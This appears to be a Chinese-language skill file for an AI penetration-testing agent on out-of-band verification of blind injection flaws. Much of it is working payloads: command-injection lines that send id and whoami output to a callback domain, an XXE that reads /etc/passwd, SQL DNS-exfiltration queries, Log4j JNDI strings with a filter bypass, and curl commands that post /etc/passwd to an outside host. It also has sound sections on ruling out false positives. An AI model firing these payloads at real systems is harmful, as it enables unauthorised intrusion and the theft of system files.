---
name: oob-verify
description: 带外验证（OOB）。用 DNS/HTTP 回调证明盲 RCE、盲 SSRF、盲 XXE、反序列化、SQLi 外带是否真的成立。含自建 DNSLog、回调唯一标记、时序基线、误报排除。
---

# 带外验证（OOB）

## 触发条件
- 打了 payload 但**没有回显**，需要证明"服务器真的执行/请求了"
- 盲 SSRF / 盲 RCE / 盲 XXE / 盲命令注入 / 盲反序列化
- 报告里要写"已确认"而不是"疑似"

**核心原则：没有回调证据的盲打结论一律写「未验证」。**

## 一、起一个带外接收器（三选一）

### A. 公网 DNSLog（最省事，先试这个）
```bash
# interactsh（ProjectDiscovery 官方，开源，可自建）
interactsh-client -v
# 输出一个域名，形如  xxxxxxxx.oast.pro
# 之后所有子域解析和 HTTP 请求都会打到这里

# 备选（第三方，注意数据可见性）
# dnslog.cn / ceye.io / Burp Collaborator
```

### B. 自建 HTTP 监听（有公网 IP 时）
```bash
# 起一个会把请求头和路径打出来的小服务
python - <<'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print("[HIT]", self.path, dict(self.headers), flush=True)
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        print("[HIT-POST]", self.path, self.rfile.read(n)[:500], flush=True)
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass
HTTPServer(("0.0.0.0", 8000), H).serve_forever()
EOF
```

### C. 自建 DNS（目标不出网只出 DNS 时，最后手段）
```bash
# 用 dnschef / 自建 bind 把 *.你的域 全指回来
# 适合：目标禁止 HTTP 出网但允许 DNS 解析
```

## 二、回调标记（防止误报，必须做）

**每次 payload 用唯一子域**，否则分不清是哪个请求触发的：
```bash
MARK="t$(date +%s)$(head -c3 /dev/urandom | xxd -p)"
HOST="http://$MARK.oast.pro"
echo "本次标记: $HOST"
```
**记录表**（落 `logs/oob.tsv`）：
```
时间            标记           payload         目标接口        回调时间    结论
15:20:01  t1732089600a1  ${jndi:ldap://...}  /api/xxx  15:20:09  命中
```

## 三、各类型的具体 payload

### 盲 RCE / 命令注入
```bash
; curl http://$MARK.oast.pro/$(id|base64 -w0)
| nslookup $(whoami).$MARK.oast.pro
`ping -c1 $MARK.oast.pro`
$(curl$IFS$9$MARK.oast.pro)
%0a curl http://$MARK.oast.pro/
```
**DNS 型最可靠**（多数环境允许 DNS 出网）：`nslookup $(id|base64).$MARK.oast.pro`

### 盲 SSRF
```bash
url=http://$MARK.oast.pro/
url=http://$MARK.oast.pro:80/
# 确认是服务端发的而不是浏览器发的：
#   服务端 UA/无 Referer/来自目标 IP 段  ⇒ 服务端
#   带浏览器指纹/Referer 是目标站        ⇒ 前端预取，不算
```

### 盲 XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://MARK.oast.pro/x.dtd"> %p;]>
<r>&ex;</r>
```
```dtd
<!-- x.dtd，放在 $MARK.oast.pro/x.dtd -->
<!ENTITY ex SYSTEM "file:///etc/passwd">
```
**注意**：多数解析器禁外部实体；先试 `file://` 直接读，不行再试外带。

### 盲 SQLi 外带
```sql
-- MySQL（能出网时最直接）
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.MARK.oast.pro\\a'))-- -
-- 或在 Windows 上用 xp_dirtree
'; EXEC master..xp_dirtree '\\MARK.oast.pro\a'-- -
```
**MySQL 的 LOAD_FILE + UNC 路径是经典 DNS 外带**，但需要 `secure_file_priv` 为空。

### 盲反序列化
```bash
# Java：URLDNS gadget（无需依赖，只发一次 DNS）
java -jar ysoserial.jar URLDNS "http://$MARK.oast.pro/" > p.ser
# 回调来 = 反序列化点成立（不证明能 RCE，只证明在反序列化）
```

### Log4j2 / JNDI
```bash
${jndi:ldap://$MARK.oast.pro/a}
${jndi:dns://$MARK.oast.pro/a}
${${lower:j}ndi:${lower:l}dap://$MARK.oast.pro/a}     # 绕过简单过滤
```
打的位置：UA / X-Forwarded-For / Referer / 用户名 / 搜索词 / 任何进日志的字段。

## 四、时序基线（没有 DNS 回调时的替代判据）

```bash
# 1) 先测基线（连续 5 次，取中位数）
for i in 1 2 3 4 5; do
  curl -sS -o /dev/null -w '%{time_total}\n' "$URL?id=1"
done

# 2) 打延时 payload
curl -sS -o /dev/null -w '%{time_total}\n' "$URL?id=1' AND SLEEP(5)-- -"

# 3) 判据：延时 > 基线中位数 + 4 秒 且 可重复 3 次 ⇒ 成立
```
**必须重复 3 次**，单次慢不代表注入（可能网络抖动）。

## 五、误报排除（这一节决定结论能不能用）

| 现象 | 真实原因 | 结论 |
|---|---|---|
| 收到回调但来自你自己的浏览器 | 前端预取 / DNS 预解析 / 链接预览 | 不算 |
| 回调来自你自己的 IP | payload 被前端执行了 | 不算（除非你要的是 XSS） |
| 只收到一次且时间对不上 | 可能是扫描器/爬虫 | 重打一次确认可重复 |
| DNS 有回调但 HTTP 没有 | DNS 出网通、HTTP 被封 | **仍算成立**（证明执行了） |
| 延时每次都不一样 | 网络抖动 | 不算，要 3 次一致 |
| 目标返回了你的 payload 原文 | 只是反射 | 不算 |

**判定顺序**：
```
1) 回调可重复吗？（同一 payload 打 3 次，回调 ≥2 次）
2) 来源是目标 IP 段吗？（不是你的出口 IP）
3) 时间对得上吗？（发送后 30 秒内）
三条全过 ⇒ 成立
```

## 六、从"证明存在"到"拿到东西"

OOB 只证明"执行了"。要拿数据，需要把结果编码进请求：

```bash
# 命令执行回显外带（DNS 型）
; nslookup $(id | base64 -w0 | tr '+/' '-_' | tr -d '=').$MARK.oast.pro

# HTTP 型（能出 HTTP 时更直接）
; curl -X POST http://$MARK.oast.pro/ --data-binary @/etc/passwd
; curl http://$MARK.oast.pro/$(cat /etc/passwd | base64 -w0 | head -c 200)
```
**DNS 标签最长 63 字节**，超过要分段。

## 判废
- **没有回调、没有时序差异、没有错误差异** ⇒ 写「未验证」，不许写「疑似存在」
- OOB 成立 ≠ 能拿权限。要写清：证明了什么（执行/请求），没证明什么（数据/权限）

## 卡住时
```
回调一直不来        → 目标不出网。转 pentest-injection 的布尔/时间盲注
只出 DNS            → 用 nslookup/ping 型 payload，不要用 curl
interactsh 被墙     → 自建（有 VPS）或换 dnslog.cn
回调太多分不清      → 每次唯一标记，落 logs/oob.tsv
```

## 纪律
- 每个盲打结论必须附：**标记域名 + 发送时间 + 回调时间 + 回调来源**
- 落盘 `logs/oob.tsv`，报告里引用行号
- 不把"反射"、"预取"、"抖动"写成命中
